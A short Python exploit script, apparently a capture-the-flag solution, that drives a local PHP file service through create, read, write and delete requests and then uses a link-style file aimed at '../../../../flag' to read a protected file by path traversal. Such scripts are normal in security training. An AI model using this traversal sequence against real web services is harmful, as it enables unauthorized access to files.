#!/usr/bin/env python3

import requests
import threading
from time import sleep
import hashlib

sess1 = {"PHPSESSID":"qweqweqweqwe"}
sess2 = {"PHPSESSID":"asdasdasdasd"}
url = "http://localhost:8888/"

def create(name, mode, target="", cookies=sess1):
    if mode:
        conn = requests.post(url, cookies=cookies, data={"mode":"create", "name":name, "type":str(mode) ,"target":target})
    else:
        conn = requests.post(url, cookies=cookies, data={"mode":"create", "name":name})

def read(filename, offset=0, cookies=sess1):
    conn = requests.post(url, cookies=cookies, data={"mode":"read", "name":filename, "offset":offset})
    r1 = conn.text
    print(r1)

def write(filename, msg, offset=0, cookies=sess1):
    conn = requests.post(url, cookies=cookies, data={"mode":"write","data":msg,"name":filename, "offset":str(offset)})
    print(conn.text)

def delete(dest, cookies=sess1):
    conn = requests.post(url, cookies=cookies, data={"mode":"delete", "name":dest})


create("flag", 0)
create("file", 1, "flag")
delete("flag")
create("file", 1, "../../../../flag")
read("flag")
